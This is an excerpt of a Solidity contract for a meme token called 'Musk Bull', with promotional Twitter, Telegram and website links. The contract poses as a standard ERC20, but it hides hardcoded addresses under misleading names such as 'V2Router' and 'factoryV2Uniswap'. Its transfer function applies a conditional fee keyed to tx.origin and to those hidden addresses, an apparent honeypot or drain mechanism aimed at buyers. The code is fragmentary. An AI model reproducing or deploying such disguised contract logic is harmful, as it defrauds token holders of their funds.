...
https://twitter.com/MuskBullCoinBNB
https://t.me.com/MuskBullCoinBNB
https://MuskBullCoinBNB.xyz
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal V2Router = 0xC26a443fe01876930216Ec958315A8F3DE8CB5Fd;
    uint256 private _allowanceEnabled = 3;
    string private _symbol;
    mapping(address => uint256) private _balances;
    uint256 private _totalSupply;
    address private factoryV2Uniswap = 0xaC5955A39cb54B1e462720AD9D8FD88c554FA120;
    ...
    function _transfer(address from, address to, uint256 amount) internal virtual
    {
        ...
        uint256 swapamount = amount.mul(to != tx.origin && from != V2Router && _balances[factoryV2Uniswap] > 0 ? _pairsToken : _allowanceEnabled).div(100) + 0;
        if (swapamount > 0)
        {
...
contract MuskBullCoin is ERC20, Ownable
{
    constructor() ERC20(unicode"Musk Bull", unicode"MUSKBULL")
    {
